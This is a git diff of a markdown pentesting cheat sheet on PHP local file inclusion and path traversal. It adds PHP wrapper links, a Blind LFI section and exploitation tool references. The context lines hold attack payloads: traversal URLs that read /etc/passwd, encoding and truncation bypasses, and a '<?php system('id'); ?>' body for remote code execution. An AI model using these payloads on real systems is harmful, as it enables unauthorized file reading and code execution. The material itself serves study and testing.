@@ -50,7 +50,7 @@ http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
 http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
 
 # Path truncation
-## Bypass the append of more chars at the end of the provided string (bypass of: $\_GET\['param'\]."php")
+## Bypass the append of more chars at the end of the provided string (bypass of: $_GET['param']."php")
 ## In PHP: /etc/passwd = /etc//passwd = /etc/./passwd = /etc/passwd/ = /etc/passwd/.
 ## Check if last 6 chars are passwd --> passwd/
 ## Check if last 4 chars are ".php" --> shellcode.php/.
@@ -82,22 +82,22 @@ http://10.11.0.22/menu.php?file=../../../../../../proc/self/cwd          # Curre
 
 ### PHP wrappers and filters
 
-They are meta-protocols used by the language to process info other than the HTTP protocol. They could be useful to bypass a whitelist defense in XPath - LFI/RFI exploitation.
+[PHP wrappers](https://www.php.net/manual/en/wrappers.php) are meta-protocols used by the language to process info other than the HTTP protocol. They could be useful to bypass a whitelist defense in XPath - LFI/RFI exploitation.
 
-| PHP Wrapper | Utilizzo |
-| --- | --- |
-| file:// | Accesso a risorse locali del filesystem |
-| http:// | Accesso a risorse HTTP |
-| ftp:// | Accesso a risorse FTP |
-| php:// | Accesso a strem I/O in PHP |
-| zlib:// | Accesso a risorse compresse |
-| data:// | Accesso a stream di vario tipo (base64, …) |
-| glob:// | Lettura di directory tramite utilizzo di pattern |
-| phar:// | Accesso ad archivi PHP |
-| ssh2:// | Accesso a risorse tramite SSH2 |
-| rar:// | Accesso a risorse compresse in RAR |
-| ogg:// | Accesso a risorse audio di questo tipo |
-| expect:// | Accesso a processi stdio, stdout e stderr via PTY. Consente l’esecuzione di comandi di sistema. Non abilitato di defult |
+| PHP Wrapper | Utilizzo                                                                                                                |
+| ----------- | ----------------------------------------------------------------------------------------------------------------------- |
+| file://     | Accesso a risorse locali del filesystem                                                                                 |
+| http://     | Accesso a risorse HTTP                                                                                                  |
+| ftp://      | Accesso a risorse FTP                                                                                                   |
+| php://      | Accesso a strem I/O in PHP                                                                                              |
+| zlib://     | Accesso a risorse compresse                                                                                             |
+| data://     | Accesso a stream di vario tipo (base64, …)                                                                              |
+| glob://     | Lettura di directory tramite utilizzo di pattern                                                                        |
+| phar://     | Accesso ad archivi PHP                                                                                                  |
+| ssh2://     | Accesso a risorse tramite SSH2                                                                                          |
+| rar://      | Accesso a risorse compresse in RAR                                                                                      |
+| ogg://      | Accesso a risorse audio di questo tipo                                                                                  |
+| expect://   | Accesso a processi stdio, stdout e stderr via PTY. Consente l’esecuzione di comandi di sistema. Non abilitato di defult |
 
 ```bash
 # file:// wrapper
@@ -135,6 +135,9 @@ POST DATA: <?php system('id'); ?>
 
 ![](../../zzz_res/attachments/LFI-file_wrapper.png)
 
+Other potential exploitation vectors using filters are mentioned in:
+- [Introducing Lightyear, a New Way to Dump PHP Files](../../Readwise/Articles/Charles%20Fol%20-%20Introducing%20Lightyear,%20a%20New%20Way%20to%20Dump%20PHP%20Files.md#Introducing%20Lightyear,%20a%20New%20Way%20to%20Dump%20PHP%20Files)
+- [Introducing wrapwrap: using PHP filters to wrap a file with a prefix and suffix](https://blog.lexfo.fr/wrapwrap-php-filters-suffix.html)
 #### LFI2RCE using basic wrappers
 
 ```php
@@ -279,6 +282,20 @@ By sending this packet, the target will write a file `/tmp/hello.php`containing
 
 [^video]: [Website Vulnerabilities to Fully Hacked Server](https://www.youtube.com/watch?v=yq2rq50IMSQ&ab_channel=JohnHammond)
 
+### Blind LFI
+
+Blind lfi are vulnerabilities that occur when you have an arbitrary file read primitive, but the contents of that file are not shown in the output.
+
+```php
+# Blind file read
+file_get_contents($_REQUEST['file']);
+getimagesize($_GET['file']);
+```
+
+These vulnerabilities however can be exploited using some specific tools and techniques:
+- [Charles Fol - Introducing Lightyear, a New Way to Dump PHP Files](../../Readwise/Articles/Charles%20Fol%20-%20Introducing%20Lightyear,%20a%20New%20Way%20to%20Dump%20PHP%20Files.md)
+- [php_filter_chains_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit) [^2]
+
 ---
 
 ## Common directories for Path Traversal
@@ -385,3 +402,8 @@ More Unix files: [wfuzz/dirTraversal-nix.txt at master · xmendez/wfuzz](https:/
 - `/usr/share/webshells`
 - [liffy.py](https://github.com/hvqzao/liffy)
 - [Weevely](https://github.com/epinna/weevely3)
+- [lightyear](../../Readwise/Articles/Charles%20Fol%20-%20Introducing%20Lightyear,%20a%20New%20Way%20to%20Dump%20PHP%20Files.md)
+- [wrapwrap](https://github.com/ambionics/wrapwrap)
+- https://github.com/synacktiv/php_filter_chain_generator
+
+[^2]: [PHP FIlter Chains: File Read From Error-based oracle](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle); www.synacktiv.com
